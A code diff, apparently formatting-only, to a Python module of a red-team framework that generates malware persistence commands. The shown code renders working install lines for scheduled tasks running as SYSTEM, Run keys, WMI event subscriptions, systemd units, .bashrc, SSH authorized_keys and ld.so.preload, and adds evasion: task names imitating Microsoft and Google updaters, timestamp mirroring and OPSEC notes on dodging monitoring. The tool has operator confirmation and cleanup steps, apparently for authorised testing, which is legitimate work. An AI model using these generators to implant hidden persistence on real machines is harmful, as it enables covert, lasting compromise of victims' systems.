@@ -26,6 +26,7 @@ OPSEC reference (§12.5.4):
   - COM hijack avoids Run key monitoring (HKCU\Software\Classes\CLSID).
   - All cleanup commands stored at creation time; forge clean must not be skipped.
 """
+
 from __future__ import annotations
 
 import json
@@ -53,25 +54,31 @@ _BANNED_PERSISTENCE_SIGS = [
 
 # Technique → LOLBin mapping
 TECHNIQUE_LOLBIN: dict[str, str] = {
-    "schtask":       "schtasks.exe",
-    "registry_run":  "reg.exe",
-    "wmi_event":     "wmic.exe",
-    "startup_folder":"xcopy.exe",
-    "service":       "sc.exe",
-    "bitsadmin":     "bitsadmin.exe",
-    "com_hijack":    "reg.exe",
-    "cron":          "crontab",
-    "systemd":       "systemctl",
-    "bashrc":        "tee",
-    "ssh_key":       "tee",
-    "ldpreload":     "ld",
-    "dll_hijack":    "",
+    "schtask": "schtasks.exe",
+    "registry_run": "reg.exe",
+    "wmi_event": "wmic.exe",
+    "startup_folder": "xcopy.exe",
+    "service": "sc.exe",
+    "bitsadmin": "bitsadmin.exe",
+    "com_hijack": "reg.exe",
+    "cron": "crontab",
+    "systemd": "systemctl",
+    "bashrc": "tee",
+    "ssh_key": "tee",
+    "ldpreload": "ld",
+    "dll_hijack": "",
 }
 
 SUPPORTED_TECHNIQUES: dict[str, list[str]] = {
     "windows": [
-        "schtask", "registry_run", "wmi_event", "startup_folder",
-        "service", "dll_hijack", "bitsadmin", "com_hijack",
+        "schtask",
+        "registry_run",
+        "wmi_event",
+        "startup_folder",
+        "service",
+        "dll_hijack",
+        "bitsadmin",
+        "com_hijack",
     ],
     "linux": ["cron", "systemd", "bashrc", "ssh_key", "ldpreload"],
 }
@@ -86,14 +93,14 @@ _COM_HIJACK_CLSIDS = [
 
 @dataclass
 class PersistenceArtifact:
-    technique:      str
-    target_os:      str
-    task_name:      str
-    install_cmd:    str
-    cleanup_cmd:    Optional[str]
-    timestamp_cmd:  Optional[str]
-    lolbins_used:   list[str] = field(default_factory=list)
-    cron_path:      Optional[str] = None
+    technique: str
+    target_os: str
+    task_name: str
+    install_cmd: str
+    cleanup_cmd: Optional[str]
+    timestamp_cmd: Optional[str]
+    lolbins_used: list[str] = field(default_factory=list)
+    cron_path: Optional[str] = None
 
     def get(self, key: str, default=None):
         return getattr(self, key, default)
@@ -118,23 +125,23 @@ class PersistenceGenerator:
 
     def __init__(
         self,
-        kb_db:         Path,
-        eng_db:        Optional[Path] = None,
-        engagement_id: int            = 0,
+        kb_db: Path,
+        eng_db: Optional[Path] = None,
+        engagement_id: int = 0,
     ) -> None:
-        self._kb_db         = kb_db
-        self._eng_db        = eng_db
+        self._kb_db = kb_db
+        self._eng_db = eng_db
         self._engagement_id = engagement_id
 
     def generate(
         self,
-        technique:             str,
-        target_os:             str,
-        payload_cmd:           str,
-        task_name:             Optional[str] = None,
-        obfuscate:             bool          = True,
+        technique: str,
+        target_os: str,
+        payload_cmd: str,
+        task_name: Optional[str] = None,
+        obfuscate: bool = True,
         mirror_timestamp_from: Optional[str] = None,
-        clsid:                 Optional[str] = None,
+        clsid: Optional[str] = None,
     ) -> PersistenceArtifact:
         """Build and return a PersistenceArtifact. Does NOT write to disk."""
         target_os = target_os.lower()
@@ -147,10 +154,13 @@ class PersistenceGenerator:
             )
 
         resolved_name = task_name or self._get_legit_task_name(target_os)
-        cron_path = self._get_legit_cron_path() if target_os == "linux" and technique == "cron" else None
-        install_cmd   = self._render_install(technique, target_os, payload_cmd,
-                                             resolved_name, clsid, cron_path)
-        cleanup_cmd   = self._render_cleanup(technique, target_os, resolved_name)
+        cron_path = (
+            self._get_legit_cron_path() if target_os == "linux" and technique == "cron" else None
+        )
+        install_cmd = self._render_install(
+            technique, target_os, payload_cmd, resolved_name, clsid, cron_path
+        )
+        cleanup_cmd = self._render_cleanup(technique, target_os, resolved_name)
         timestamp_cmd = self._render_timestamp(mirror_timestamp_from)
 
         if obfuscate and target_os == "windows":
@@ -159,20 +169,21 @@ class PersistenceGenerator:
         self._assert_no_banned_sigs(install_cmd)
 
         return PersistenceArtifact(
-            technique     = technique,
-            target_os     = target_os,
-            task_name     = resolved_name,
-            install_cmd   = install_cmd,
-            cleanup_cmd   = cleanup_cmd,
-            timestamp_cmd = timestamp_cmd,
-            lolbins_used  = [TECHNIQUE_LOLBIN.get(technique, "")],
-            cron_path     = cron_path,
+            technique=technique,
+            target_os=target_os,
+            task_name=resolved_name,
+            install_cmd=install_cmd,
+            cleanup_cmd=cleanup_cmd,
+            timestamp_cmd=timestamp_cmd,
+            lolbins_used=[TECHNIQUE_LOLBIN.get(technique, "")],
+            cron_path=cron_path,
         )
 
     def save(self, artifact: PersistenceArtifact, output_path: Path) -> None:
         """Write artifact to disk after operator confirmation. Persist cleanup_cmd to DB."""
         try:
             import questionary
+
             confirmed = questionary.confirm(
                 f"[Module 5-I] Write persistence artifact:\n"
                 f"  Technique: {artifact.technique}\n"
@@ -205,21 +216,25 @@ class PersistenceGenerator:
         table = "schtasks_legit_names" if target_os == "windows" else "cron_legit_names"
         try:
             con = direct_connect(f"file:{self._kb_db}?mode=ro", uri=True)
-            row = con.execute(
-                f"SELECT name FROM {table} ORDER BY RANDOM() LIMIT 1"
-            ).fetchone()
+            row = con.execute(f"SELECT name FROM {table} ORDER BY RANDOM() LIMIT 1").fetchone()
             con.close()
             if row:
                 return row[0]
         except sqlite3.OperationalError:
             pass
         # Fallback to a safe-looking name
-        return random.choice([
-            "MicrosoftEdgeUpdateTaskMachineCore",
-            "GoogleUpdateTaskMachineCore",
-            "MicrosoftWindowsUpdateTask",
-            "WindowsDefenderScheduledScan",
-        ]) if target_os == "windows" else "cron-helper"
+        return (
+            random.choice(
+                [
+                    "MicrosoftEdgeUpdateTaskMachineCore",
+                    "GoogleUpdateTaskMachineCore",
+                    "MicrosoftWindowsUpdateTask",
+                    "WindowsDefenderScheduledScan",
+                ]
+            )
+            if target_os == "windows"
+            else "cron-helper"
+        )
 
     def _render_install(
         self,
@@ -236,11 +251,7 @@ class PersistenceGenerator:
 
     def _win_install(self, technique: str, cmd: str, name: str, clsid: Optional[str]) -> str:
         if technique == "schtask":
-            return (
-                f'schtasks /create /tn "{name}" '
-                f'/tr "{cmd}" '
-                '/sc ONLOGON /ru SYSTEM /f'
-            )
+            return f'schtasks /create /tn "{name}" /tr "{cmd}" /sc ONLOGON /ru SYSTEM /f'
         if technique == "registry_run":
             # NOTE: HKCU preferred over HKLM (no admin required; less monitored)
             return (
@@ -249,16 +260,16 @@ class PersistenceGenerator:
             )
         if technique == "wmi_event":
             return (
-                f'$f=Set-WMIInstance -Namespace root/subscription '
+                f"$f=Set-WMIInstance -Namespace root/subscription "
                 f'-Class __EventFilter -Arguments @{{Name="{name}";'
                 f'EventNameSpace="root/cimv2";'
                 f'QueryLanguage="WQL";'
-                f'Query="SELECT * FROM __TimerEvent WHERE TimerID=\'{name}\'"}}; '
-                f'$c=Set-WMIInstance -Namespace root/subscription '
+                f"Query=\"SELECT * FROM __TimerEvent WHERE TimerID='{name}'\"}}; "
+                f"$c=Set-WMIInstance -Namespace root/subscription "
                 f'-Class CommandLineEventConsumer -Arguments @{{Name="{name}";'
                 f'CommandLineTemplate="{cmd}"}}; '
-                f'Set-WMIInstance -Namespace root/subscription '
-                f'-Class __FilterToConsumerBinding -Arguments @{{Filter=$f;Consumer=$c}}'
+                f"Set-WMIInstance -Namespace root/subscription "
+                f"-Class __FilterToConsumerBinding -Arguments @{{Filter=$f;Consumer=$c}}"
             )
         if technique == "startup_folder":
             return f'xcopy /y "{cmd.split()[0]}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
@@ -278,8 +289,8 @@ class PersistenceGenerator:
             )
         if technique == "dll_hijack":
             return (
-                f'# DLL hijack: place {cmd} as <application_dir>\\<missing_dll>.dll\n'
-                f'# Validate with Process Monitor: filter on NAME NOT FOUND for target app.'
+                f"# DLL hijack: place {cmd} as <application_dir>\\<missing_dll>.dll\n"
+                f"# Validate with Process Monitor: filter on NAME NOT FOUND for target app."
             )
         return f"# Unknown technique: {technique}"
 
@@ -295,9 +306,9 @@ class PersistenceGenerator:
                 "[Install]\nWantedBy=multi-user.target"
             ).format(cmd=cmd)
             return (
-                f'cat > /etc/systemd/system/{name}.service << \'EOF\'\n'
-                f'{unit}\nEOF\n'
-                f'systemctl enable {name} && systemctl start {name}'
+                f"cat > /etc/systemd/system/{name}.service << 'EOF'\n"
+                f"{unit}\nEOF\n"
+                f"systemctl enable {name} && systemctl start {name}"
             )
         if technique == "bashrc":
             return f'echo "{cmd} &" >> ~/.bashrc'
@@ -305,8 +316,8 @@ class PersistenceGenerator:
             return f'mkdir -p ~/.ssh && echo "{cmd}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
         if technique == "ldpreload":
             return (
-                f'# Compile shared object: gcc -shared -fPIC -o /tmp/.{name}.so {cmd}.c\n'
-                f'echo /tmp/.{name}.so >> /etc/ld.so.preload'
+                f"# Compile shared object: gcc -shared -fPIC -o /tmp/.{name}.so {cmd}.c\n"
+                f"echo /tmp/.{name}.so >> /etc/ld.so.preload"
             )
         return f"# Unknown technique: {technique}"
 
@@ -334,10 +345,10 @@ class PersistenceGenerator:
                 )
             if technique == "wmi_event":
                 return (
-                    f'Get-WMIObject -Namespace root/subscription -Class __EventFilter '
-                    f'-Filter "Name=\'{name}\'" | Remove-WmiObject; '
-                    f'Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer '
-                    f'-Filter "Name=\'{name}\'" | Remove-WmiObject'
+                    f"Get-WMIObject -Namespace root/subscription -Class __EventFilter "
+                    f"-Filter \"Name='{name}'\" | Remove-WmiObject; "
+                    f"Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer "
+                    f"-Filter \"Name='{name}'\" | Remove-WmiObject"
                 )
             if technique == "service":
                 return f'sc stop "{name}" && sc delete "{name}"'
@@ -350,11 +361,11 @@ class PersistenceGenerator:
             if technique == "cron":
                 return f'crontab -l | grep -v "{name}" | crontab -'
             if technique == "systemd":
-                return f'systemctl disable {name} && systemctl stop {name} && rm /etc/systemd/system/{name}.service'
+                return f"systemctl disable {name} && systemctl stop {name} && rm /etc/systemd/system/{name}.service"
             if technique == "bashrc":
                 return f'sed -i "/{re.escape(name)}/d" ~/.bashrc'
             if technique in ("ssh_key", "ldpreload"):
-                return f'# Manual cleanup required for {technique}'
+                return f"# Manual cleanup required for {technique}"
         return None
 
     @staticmethod
@@ -362,7 +373,7 @@ class PersistenceGenerator:
         if not mirror_from:
             return None
         return (
-            f"python3 -c \""
+            f'python3 -c "'
             f"import os; "
             f"s=os.stat(r'{mirror_from}'); "
             f"# Replace <target_file> with the actual artifact path\n"
@@ -414,6 +425,7 @@ class PersistenceGenerator:
     def _register_cleanup(path: Path) -> None:
         try:
             from forge.shared.cleanup import register_cleanup_file
+
             register_cleanup_file(path)
         except ImportError:
             pass
